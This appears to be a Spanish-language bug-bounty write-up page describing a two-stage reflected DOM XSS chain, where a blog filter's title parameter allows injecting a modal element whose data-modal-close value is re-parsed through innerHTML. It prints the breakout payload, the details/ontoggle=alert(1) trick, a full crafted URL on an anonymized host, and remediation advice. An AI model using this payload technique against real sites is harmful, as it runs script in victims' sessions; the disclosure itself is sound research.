@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Reflected DOM XSS en un filtro de blog | ZsZsec</title>
+  <meta name="description" content="Análisis técnico de una cadena DOM XSS de dos etapas en un filtro de blog y un componente modal." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/bug-bounty/reflected-dom-xss-blog-modal-chain.html" />
+  <meta property="og:title" content="Reflected DOM XSS en un filtro de blog" />
+  <meta property="og:description" content="Análisis técnico de una cadena DOM XSS de dos etapas en un filtro de blog y un componente modal." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/bug-bounty/reflected-dom-xss-blog-modal-chain.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Reflected DOM XSS en un filtro de blog" />
+  <meta name="twitter:description" content="Cadena DOM XSS de dos etapas en un filtro de blog y un componente modal." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../bug-bounty.html" aria-current="page">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">bug bounty / web security</p>
+      <h1>DOM XSS modal chain<span>_</span></h1>
+      <div class="writeup-meta"><span>CWE-79</span><span>Medium</span></div>
+      <div class="tag-row"><span class="tag">Web Security</span><span class="tag">DOM XSS</span><span class="tag">Reflected XSS</span><span class="tag">JavaScript</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <p>Encontré este comportamiento durante pruebas autorizadas en un programa privado de bug bounty. El filtro público de un blog reflejaba el parámetro <code>title</code> dentro del área de filtros activos y permitía salir del contenedor original para inyectar un elemento nuevo.</p>
+
+        <p>La primera inyección no ejecutaba JavaScript por sí sola. El elemento añadido activaba el componente de modales del sitio, que recuperaba un atributo controlado y lo asignaba a <code>innerHTML</code>. Ese segundo parseo convertía HTML codificado en markup ejecutable y disparaba el payload al cargar la página.</p>
+
+        <blockquote><p>El programa, el dominio, el identificador del reporte, la versión, el header requerido y los nombres propios están omitidos o sustituidos por valores sintéticos.</p></blockquote>
+
+        <h2>Ficha técnica</h2>
+
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Categoría</td><td>Reflected DOM-Based XSS</td></tr>
+            <tr><td>CWE</td><td>CWE-79</td></tr>
+            <tr><td>Criticidad</td><td>Medium</td></tr>
+            <tr><td>Superficie</td><td>Filtro público de un blog</td></tr>
+            <tr><td>Source</td><td>Parámetro <code>title</code></td></tr>
+            <tr><td>Primer efecto</td><td>HTML breakout e inyección de un elemento modal</td></tr>
+            <tr><td>Sink final</td><td><code>closeBtn.innerHTML</code></td></tr>
+            <tr><td>Autenticación</td><td>No requerida</td></tr>
+            <tr><td>Interacción</td><td>Abrir un enlace preparado</td></tr>
+            <tr><td>Estado</td><td>Reportado / pendiente de revisión</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Una cadena de dos etapas</h2>
+
+        <p>El parámetro <code>title</code> llegaba al filtro activo con suficiente control para cerrar el contenedor existente y crear otro elemento. Preparé ese elemento con los atributos que el JavaScript utilizaba para descubrir e inicializar modales:</p>
+
+        <pre><code class="language-html">procurement &lt;/div&gt;&lt;div
+  id=modal-probe
+  data-modal=probe
+  data-modal-close=&amp;lt;details/open/ontoggle=alert(1)&amp;gt;X&amp;lt;/details&amp;gt;
+&gt;BODY&lt;/div&gt;</code></pre>
+
+        <p>El atributo <code>data-modal</code> hacía que el componente tratara el nodo inyectado como un modal válido. El valor de <code>data-modal-close</code> permanecía codificado en esa primera representación, por lo que todavía no existía un elemento <code>&lt;details&gt;</code> ejecutable.</p>
+
+        <p>La segunda etapa aparecía durante la inicialización del componente:</p>
+
+        <pre><code class="language-javascript">var modalClose = self.getAttribute("data-modal-close");
+// ...
+closeBtn.innerHTML = modalClose;</code></pre>
+
+        <p><code>getAttribute()</code> devolvía el valor interpretado del atributo. Al enviarlo a <code>innerHTML</code>, el navegador lo parseaba de nuevo y generaba este nodo:</p>
+
+        <pre><code class="language-html">&lt;details open ontoggle="alert(1)"&gt;X&lt;/details&gt;</code></pre>
+
+        <p>Como el elemento se creaba abierto, el evento <code>toggle</code> se disparaba sin que la persona tuviera que hacer otro clic.</p>
+
+        <h2>Por qué funcionaba la sintaxis con barras</h2>
+
+        <p>El valor inyectado utilizaba:</p>
+
+        <pre><code class="language-html">&lt;details/open/ontoggle=alert(1)&gt;X&lt;/details&gt;</code></pre>
+
+        <p>El parser HTML interpretaba las barras como separadores dentro de la etiqueta y terminaba creando los atributos <code>open</code> y <code>ontoggle</code>. El resultado relevante no era la forma original del string, sino el DOM normalizado por el navegador.</p>
+
+        <p>Esto también permitía mantener el payload compacto y sin espacios dentro del atributo que lo transportaba.</p>
+
+        <h2>Reproducción anonimizada</h2>
+
+        <p>La URL de prueba seguía esta estructura:</p>
+
+        <pre><code>https://blog.example.test/blog?title=procurement%20%3C%2Fdiv%3E%3Cdiv%20id%3Dmodal-probe%20data-modal%3Dprobe%20data-modal-close%3D%26lt%3Bdetails%2Fopen%2Fontoggle%3Dalert(1)%26gt%3BX%26lt%3B%2Fdetails%26gt%3B%3EBODY%3C%2Fdiv%3E</code></pre>
+
+        <p>Al abrirla, la página inicializaba el nodo inyectado, creaba su botón de cierre y ejecutaba <code>alert(1)</code> durante el segundo parseo.</p>
+
+        <p>El flujo completo era:</p>
+
+        <pre><code>title controlado desde la URL
+        ↓
+breakout del filtro activo
+        ↓
+elemento inyectado con data-modal
+        ↓
+lectura de data-modal-close
+        ↓
+asignación a innerHTML
+        ↓
+creación de &lt;details open ontoggle=...&gt;
+        ↓
+ejecución de JavaScript</code></pre>
+
+        <h2>Respuesta inicial y DOM final</h2>
+
+        <p>En la representación inicial, el contenido destinado al botón de cierre seguía codificado:</p>
+
+        <pre><code class="language-html">data-modal-close="&amp;lt;details/open/ontoggle=alert(1)&amp;gt;X&amp;lt;/details&amp;gt;"</code></pre>
+
+        <p>Después de ejecutar el código del modal, el DOM contenía un elemento nuevo dentro del botón generado:</p>
+
+        <pre><code class="language-html">&lt;div
+  id="modal-probe"
+  data-modal="probe"
+  data-modal-close="&amp;lt;details/open/ontoggle=alert(1)&amp;gt;X&amp;lt;/details&amp;gt;"
+  data-setup-modal="true"
+  role="dialog"
+  hidden
+  tabindex="-1"
+&gt;
+  BODY
+  &lt;button type="button" class="modal-close"&gt;
+    &lt;details open ontoggle="alert(1)"&gt;X&lt;/details&gt;
+  &lt;/button&gt;
+&lt;/div&gt;</code></pre>
+
+        <p>La diferencia entre ambos estados confirmó el límite de seguridad que fallaba: un valor que parecía inerte mientras estaba codificado se convertía en HTML activo cuando otro componente lo reutilizaba en un sink distinto.</p>
+
+        <h2>Impacto</h2>
+
+        <p>Una persona podía preparar un enlace público que ejecutara JavaScript bajo el origen de la aplicación cuando otra persona lo abriera. No se necesitaba autenticación y, después de navegar al enlace, el payload no requería interacción adicional.</p>
+
+        <p>No atribuí acceso adicional que no hubiera comprobado. Cualquier impacto posterior dependería de los datos y acciones disponibles para la víctima dentro de ese origen.</p>
+
+        <h2>Remediación</h2>
+
+        <p>El valor de <code>title</code> debe renderizarse como texto y no debe poder crear nodos dentro del filtro activo. Además, un componente no debería inicializar automáticamente elementos inyectados desde contenido controlado por la URL.</p>
+
+        <p>El texto del botón de cierre debe asignarse con <code>textContent</code>:</p>
+
+        <pre><code class="language-javascript">var modalClose = self.getAttribute("data-modal-close");
+closeBtn.textContent = modalClose;</code></pre>
+
+        <p>Si el producto necesita admitir HTML en ese atributo, debe aplicar una sanitización con allowlist inmediatamente antes del sink final. La CSP y el filtrado perimetral solo deberían tratarse como defensa adicional.</p>
+
+        <h2>Estado del reporte</h2>
+
+        <p>El reporte fue enviado al programa y permanece pendiente de revisión.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
